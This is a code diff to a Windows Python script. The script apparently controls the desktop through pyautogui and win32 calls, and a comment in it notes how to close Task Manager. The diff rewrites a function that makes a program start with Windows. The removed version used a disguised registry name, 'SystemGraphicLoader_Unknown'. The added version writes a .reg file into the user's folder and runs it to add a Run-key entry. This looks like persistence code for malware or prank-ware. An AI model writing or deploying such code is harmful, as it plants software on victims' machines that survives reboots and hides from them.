@@ -7,6 +7,10 @@ import pyautogui
 from threading import Thread
 from win32 import *
 import os
+import win32com.client
+import getpass
+
+shell = win32com.client.Dispatch("WScript.Shell")
 
 LAST_WINDOW = 0
 
@@ -97,16 +101,15 @@ def msgbox(title,text,type=16):
 #  win32gui.PostMessage(handle,win32con.WM_CLOSE,0,0) -> Close handle window if want to close task manager need permision
 
 
-win32console.SetConsoleTitle("NanoGramSecurity\\ BANANA_SECURITY")
+#win32console.SetConsoleTitle("NanoGramSecurity\\ BANANA_SECURITY")
 
-def AddToRegistry(path:str):
-    address=os.path.join(path)
-
-    key = winreg.HKEY_CURRENT_USER
-    key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
-
-    openReg = winreg.OpenKey(key,key_value,winreg.KEY_ALL_ACCESS)
-
-    winreg.SetValueEx(openReg,f"SystemGraphicLoader_Unknown",winreg.winreg_SZ,address)
-
-    winreg.CloseKey(openReg)
+def AddToRegistry(name,path:str):
+    registry = """Windows Registry Editor Version 5.00
+[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]
+"%s"="%s"
+""" % (name, path)
+    p = f'C:\\Users\\{getpass.getuser()}\\win.reg'
+    file = open(p,'w')
+    file.write(registry)
+    file.close()
+    os.system(p)
